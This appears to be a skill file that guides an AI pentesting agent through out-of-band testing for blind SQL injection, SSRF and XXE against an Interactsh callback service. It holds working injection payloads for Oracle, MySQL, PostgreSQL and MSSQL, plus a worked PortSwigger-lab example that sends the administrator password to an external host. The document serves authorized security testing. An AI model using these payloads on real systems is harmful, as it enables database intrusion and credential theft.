---
name: oob-workflow
description: Use for blind SSRF, blind XSS, XXE, command injection and SQLi OOB correlation via ArgusAI's built-in Interactsh client.
trigger-keywords:
  - "\\boob\\b|out-of-band|out of band|collaborator"
  - "blind (ssrf|xss|xxe|sqli|sql injection|command injection)"
  - "带外|回连|dnslog|interactsh"
trigger-tools:
  - oob_start
  - oob_payload_generate
  - oob_check_events
  - oob_status
  - sqli_probe_param
  - ssrf_probe_url_param
---

## OOB Workflow

ArgusAI does not claim an OOB hit unless a real external event is supplied or observed. ArgusAI ships a built-in Interactsh client against Project Discovery's public service (`oast.fun` and rotating siblings) — no user setup needed. Use it as the default whenever the target gives no in-band feedback (blind SSRF, blind SQLi, blind XXE, blind RCE, blind XSS).

### Minimum call sequence

1. Create or reuse a case and attach the injection request/surface as an artifact.
2. `oob_start()` once if status is unknown — registers a fresh correlation id and starts the background poll thread. You may skip this; `oob_payload_generate` lazy-registers a session on first call.
3. `oob_payload_generate(category=..., case_id=..., request_ref=..., probe_id=...)` mints a fresh per-probe subdomain (`<short_label>.<domain>`) plus a category-tailored payload (`mysql_load_file_unix`, `oracle_extractvalue_xxe`, `ssrf_url`, `xxe_dtd`, `nslookup`, `curl`, `xss_script`, ...). The `token`/`probe_id` in the response is the short label — keep it.
4. Deliver the payload through the real injection surface — usually `http_curl` or `raw_http_send` for header/cookie/param injection (fast, no per-call browser confirmation cost), `sqli_probe_param` for SQLi, or SSRF/XXE-specific tooling. Only reach for the browser (`browser_open_tab` / `browser_use_tab`) when the surface needs an authenticated session you cannot replay via cookie copy.
5. `oob_check_events(token=<short_label>, wait_seconds=15-20)` **once** for that payload — the background poller already pulls from the server every 5 seconds, so a 15-20s wait already covers 3+ polls.
6. If `matched=true`: attach the event with `artifact_add` and confirm with `evidence_add(kind='oob')`. If `matched=false`: change the payload, injection point, DBMS primitive, or token — do not repeatedly call `oob_check_events` for the same token hoping new events appear.

Evidence should include token/probe_id, payload, injection surface, event timestamp/source/protocol, and the exact request that triggered it. If no event exists, report a reproducible pending test, not a confirmed vulnerability.

### Exact-string discipline

Interactsh subdomains look like `[a-z0-9]{8}.[a-z0-9]{20}.oast.fun` — no `@`, no whitespace, no underscores. Always copy the exact `host` / `domain` string returned by the tool when reporting it or embedding it in a payload. Do not rewrite, manually URL-encode, or "fix" it because it "looks weird" — the target will never call back to a host that doesn't exist.

### DBMS fingerprint before OOB primitive

Fingerprint the DBMS before choosing an OOB primitive — firing an MSSQL `xp_dirtree` payload against an Oracle backend will never produce a callback no matter how long you wait. Send one error-revealing fingerprint request first (`' AND 1=CONVERT(int,@@version)--` for MSSQL, `' AND ROWNUM=1--` for Oracle, `' AND VERSION()--` for MySQL/Postgres) and read the response before generating OOB payloads. PortSwigger labs in the SQLi track state the DBMS in the lab description — read it.

- **Oracle (try first — PortSwigger's default OOB lab payload)**: `EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://<host>/"> %remote;]>'),'/l')` — works without `UTL_HTTP` / `UTL_INADDR` privileges because `EXTRACTVALUE` + `xmltype` is exposed to PUBLIC. The generator returns it as `oracle_extractvalue_xxe` (exfil variant: `oracle_extractvalue_xxe_exfil`).
- **Oracle (alternative, often blocked)**: `UTL_HTTP.REQUEST('http://'||(SELECT password FROM users WHERE rownum=1)||'.<host>/')` — only works with `EXECUTE ON UTL_HTTP`, denied on most labs. Try second, not first.
- **MySQL (Linux, FILE priv)**: `LOAD_FILE(CONCAT('\\\\',(SELECT password FROM users LIMIT 1),'.<host>\\a'))`. The same UNC form works on Windows — SMB resolution triggers the DNS lookup.
- **PostgreSQL**: `COPY (SELECT '') TO PROGRAM 'nslookup '||(SELECT password FROM users LIMIT 1)||'.<host>'` — needs superuser. Or `dblink_connect('host=<host> user=...')`.
- **MSSQL**: `EXEC master..xp_dirtree '\\\\<host>\\a'` (filesystem) or `EXEC master..xp_cmdshell 'nslookup <host>'` (needs `xp_cmdshell` enabled).

### Worked example — blind SQLi OOB exfiltration

PortSwigger "Blind SQLi with out-of-band data exfiltration": `TrackingId` is an unauthenticated cookie, so `http_curl` is the right tool — no login session, no browser needed.

```text
oob_start()                                    -> domain = "ab12cd34xyz.oast.fun"
oob_payload_generate(category="sqli")          -> host = "a1b2c3d4.ab12cd34xyz.oast.fun", token = "a1b2c3d4"
http_curl(
    method="GET",
    url="https://0aXXXXX.web-security-academy.net/",
    headers={"Cookie": "TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY % remote SYSTEM \"http://'||(SELECT password FROM users WHERE username='administrator')||'.a1b2c3d4.ab12cd34xyz.oast.fun/\">%remote;]>'),'/l')+FROM+dual--"},
)
oob_check_events(token="a1b2c3d4", wait_seconds=20)
# hits[0]["full-id"] -> "<admin_password>.a1b2c3d4.ab12cd34xyz.oast.fun"
# The leftmost DNS label IS the leaked value.
```

Anti-pattern: driving this through `browser_use_tab` with a hand-typed cookie. It may overwrite the user's tab, waits on `load`, can stall on `ERR_HTTP2_PROTOCOL_ERROR`, and gives no evidence `http_curl` didn't already give.

### Local reachability caveat

The user's laptop may be unable to resolve or reach the public OOB service because of ISP/DNS/proxy/corporate filtering — common in mainland China, where `*.oast.fun` can resolve to unrelated IPs. That does **not** mean OOB is broken for the assessment: the callback is made by the *target server*, not the user's laptop. Distinguish "no events captured" from "OOB is broken":

1. Re-check that the `host` value actually appears in the request the target sees, not just in your own outbound traffic.
2. `oob_status()` should show `running=true`, `registered=true`, `last_error` empty. A non-empty `last_error` means the polling channel itself is broken.
3. Wait at least 15-20s per token before concluding no callback — some labs sleep/queue.
4. If multiple tokens never produce events across attempts, recommend switching `oob.mode` to `disabled` and using Burp Collaborator manually; do not keep blindly retrying.

### Privacy note

Every DNS query and HTTP request to the callback domain is observable by Project Discovery's infrastructure. Do not embed real production secrets or PII into the subdomain when testing customer/sensitive environments. For high-sensitivity assessments, switch `oob.mode` to `disabled` in Settings, use a self-hosted Interactsh server or Burp Collaborator, then paste events into `oob_check_events(events_json=...)` manually.
